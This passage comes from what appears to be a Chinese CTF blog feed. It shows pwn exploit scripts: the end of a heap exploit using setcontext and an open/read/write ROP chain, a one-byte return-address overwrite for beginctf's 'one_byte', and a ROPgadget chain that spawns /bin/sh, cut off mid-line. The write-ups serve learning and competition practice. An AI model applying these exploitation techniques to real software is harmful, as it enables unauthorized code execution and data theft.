class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x24f</span>orw_addr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x500</span>add<span class="token punctuation">(</span><span class="token number">0x60</span> <span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>magic_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>orw_addr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x30f</span>bss_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> <span class="token string">b'./flag\x00\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>setcontext <span class="token operator">+</span> <span class="token number">61</span><span class="token punctuation">)</span>stack <span class="token operator">+=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">)</span>stack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>orw_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span> stack<span class="token punctuation">)</span>orw <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> orw<span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：<a href="https://www.cnblogs.com/pwnfeifei/p/15819825.html#/">https://www.cnblogs.com/pwnfeifei/p/15819825.html#/</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap题目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024beginctf-pwn</title>
      <link href="/2024/02/09/2024beginctf-pwn/2024beginctf-pwn/"/>
      <url>/2024/02/09/2024beginctf-pwn/2024beginctf-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="one-byte"><a href="#one-byte" class="headerlink" title="one_byte"></a>one_byte</h2><p>检查保护，开了地址随机化，没开canary</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/starrysky/beginctf/one_byte/pwn'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Full RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看程序，发现可以溢出一字节，也对应了题目的one-byte，程序会打开flag文件并且输出一字节，要读出flag必然需要printf，所以覆盖返回地址低位到printf处即可</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+7h] [rbp-9h] BYREF</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+Fh] [rbp-1h] BYREF</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to beginctf!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Here is your gift: %c\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Are you satisfied with the result?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">0x12uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span><span class="token number">31141</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Here is your gift: '</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'with the result?'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x11</span> <span class="token operator">+</span> <span class="token string">b'\x6d'</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gift-rop"><a href="#gift-rop" class="headerlink" title="gift_rop"></a>gift_rop</h2><p>打开程序，发现是静态编译的<code>c</code>，所以可以通过<code>ropgadget</code>直接获取<code>ropchain</code>，指令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span>  ./pwn <span class="token parameter variable">--ropchain</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行指令之后会返回很多<code>gadget</code>地址以及一段现成的<code>ropchain</code>，如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000448077</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044a4f5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043d1d0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044a4f5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401f2f</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000047f20b</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; pop rbx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x4141414141414141</span><span class="token punctuation">)</span> <span class="token comment"># padding</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043d1d0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; 